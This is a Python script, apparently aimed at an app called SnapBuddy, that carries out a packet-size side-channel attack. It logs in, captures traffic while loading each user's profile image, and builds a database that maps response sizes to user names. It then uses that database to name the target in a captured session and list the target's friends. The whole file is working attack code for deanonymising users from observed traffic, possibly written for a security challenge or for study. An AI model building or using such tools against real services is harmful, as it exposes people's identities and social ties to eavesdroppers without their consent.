import argparse
import json
import re
import sys
import time

import packetcollector
import processpackets

sys.path.append('../../../examples')
import interact
# work around for this issue:
# http://stackoverflow.com/questions/5530708/can-i-redirect-unicode-output-from-the-console-directly-into-a-file
import codecs

sys.stdout = codecs.getwriter('utf-8')(sys.stdout)

PROFILE_AND_NAME_PATTERN = re.compile(r'<img src="([^"]+?)".*?<td[^>]*?>([^<]+?)<', (re.MULTILINE | re.DOTALL))


class FriendsAttackDb(object):
    def __init__(self, hostname, port):
        self.hostname = hostname
        self.port = port

        # maps response size to profile image url and user name
        self.response_size_map = {}

    def build(self, username, password, interface):
        ignore_image_loading = True # Don't load images while accessing pages!
        snap_caller = interact.SnapCaller(self.hostname, self.port, username, password, ignore_image_loading)

        with interact.get_session() as session:
            tuples = self.get_image_users(snap_caller, session)

            print tuples

            for profile_url, user_name in tuples:
                with packetcollector.PacketCollector(interface, "tcp port {}".format(self.port)) as packet_collector:
                    print profile_url, user_name,
                    snap_caller.do_image(session, profile_url)
                    # give it time for the packets to be collected
                    time.sleep(1)
                    packet_collector.stop()
                    request_size, response_size = self.get_transaction(packet_collector.get_pcap())
                    print "\tsize: ", response_size
                    response_size = str(response_size)
                    if self.response_size_map.has_key(response_size):
                        print "\t\t COLLISION!"
                        self.response_size_map[response_size].append((profile_url, user_name))
                    else:
                        self.response_size_map[response_size] = [(profile_url, user_name)]

    def save(self, db_filename):
        '''
        Saves the database to the file
        '''
        with open(db_filename, 'w') as writer:
            json.dump(self.response_size_map, writer)

    def load(self, db_filename):
        with open(db_filename, 'r') as reader:
            tempDict = json.load(reader)
            # in this map, the keys will all be strings
            # but really they should be integers
            actualDict = {}
            for key, value in tempDict.items():
                actualDict[int(key)] = value
            self.response_size_map = actualDict

    def find_friends_from_pcap(self, pcap):
        '''
        Returns a list of list of user names
        '''
        transactions = processpackets.get_transactions(pcap, self.hostname, self.port)

        friends = []

        if len(transactions) > 11:
            for t in transactions[11:]:
                response_size = t.get_resp_size()
                if self.response_size_map.has_key(response_size):
                    user_names = []
                    for (profile_url, user_name) in self.response_size_map[response_size]:
                        user_names.append(user_name)
                    friends.append(user_names)

        return friends

    def find_collisions(self):
        # detect a collision by looking for than one entry with the same response size
        # list of list of (profile_url, user_name) tuples that collide with the same value
        candidates = []
        for response_size, tuples in self.response_size_map.items():
            if len(tuples) > 1:
                candidates.append(tuples)
        return candidates

    def get_image_users(self, snap_caller, session):
        '''
        :return: set of tuples (profile URI, user name)
        '''
        friends_response = snap_caller.process_login(session)
        list = PROFILE_AND_NAME_PATTERN.findall(friends_response.text)

        invite_response = snap_caller.do_invite(session)
        list.extend(PROFILE_AND_NAME_PATTERN.findall(invite_response.text))

        return set(list)  # Remove any duplicates

    def get_transaction(self, pcap):
        '''
        returns a tuple of (request size, response size) that
        corresponds to a single transaction request and response.
        If it cannot determine the location request/response pair,
        this will return the tuple (None, None).
        '''
        transactions = processpackets.get_transactions(pcap, self.hostname, self.port)

        if transactions:
            last = len(transactions) - 1
            request = transactions[last].get_req_size()
            response = transactions[last].get_resp_size()
            return request, response

        return None, None


def build(hostname, port, username, password, interface, db_output):
    attack_db = FriendsAttackDb(hostname, port)
    attack_db.build(username, password, interface)
    attack_db.save(db_output)


def find(hostname, port, dbname, target_pcap):
    attack_db = FriendsAttackDb(hostname, port)
    attack_db.load(dbname)

    friends = attack_db.find_friends_from_pcap(processpackets.read_pcap(target_pcap))

    if friends:
        user = friends.pop(0)  # User is first entry in the list
        print "Target is:", " or ".join(user)
        print

        if friends:
            print "Target has the following friends:"
            for list_of_friends in friends:
                print " or ".join(list_of_friends)
        else:
            print "No friends were observed"
    else:
        print "Could not find the target or any friends"


def collisions(hostname, port, dbname):
    attack_db = FriendsAttackDb(hostname, port)
    attack_db.load(dbname)

    collisions = attack_db.find_collisions()
    for collision in collisions:
        print "Collisions in:"
        for profile_url, user_name in collision:
            print "\t", profile_url, "\t", user_name
    print len(collisions), " collisions total."


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("serverip", help="the server ip address")
    parser.add_argument("serverport", type=int, help="the server port")
    subparsers = parser.add_subparsers(dest="command")
    buildparser = subparsers.add_parser('build', help='Build a new database')
    buildparser.add_argument("username", help="a username to use to login to snapbuddy")
    buildparser.add_argument("password", help="the password for the username")
    buildparser.add_argument("interface",
                             help="the interface to use when building the database (required when building)")
    buildparser.add_argument("outfile", help="specify the filename for the database to build")

    findparser = subparsers.add_parser('find', help="Find a user from a pcap")
    findparser.add_argument('dbname', help='filename of a prebuilt database to consult')
    findparser.add_argument('pcap', help='pcap file of observed session')

    collisionparser = subparsers.add_parser('collisions')
    collisionparser.add_argument('dbname', help='filename of a prebuilt database to consult')

    args = parser.parse_args()
    if args.command == 'build':
        build(args.serverip, args.serverport, args.username, args.password, args.interface, args.outfile)
    elif args.command == 'find':
        find(args.serverip, args.serverport, args.dbname, args.pcap)
    elif args.command == 'collisions':
        collisions(args.serverip, args.serverport, args.dbname)


if __name__ == "__main__":
    main()
